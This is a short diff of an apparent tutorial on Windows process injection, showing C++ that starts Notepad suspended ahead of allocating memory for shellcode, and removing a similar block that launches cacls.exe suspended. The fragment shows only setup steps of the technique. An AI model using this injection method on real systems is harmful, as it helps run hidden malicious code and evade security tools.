@@ -27,17 +27,6 @@ Creates Notepad in a suspended state.
 	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);
 
 ```
-Open the target process in suspended state.
-```cpp
-  STARTUPINFOA si;
-	si = {};
-	PROCESS_INFORMATION pi = {};
-	PROCESS_BASIC_INFORMATION pbi = {};
-	DWORD rLen = 0;
-	CreateProcessA(0, (LPSTR)"C:\\Windows\\System32\\cacls.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
-
-
-```
 Allocates memory in the suspended process for shellcode.
 ```cpp
 // 4. Allocate memory in the target process
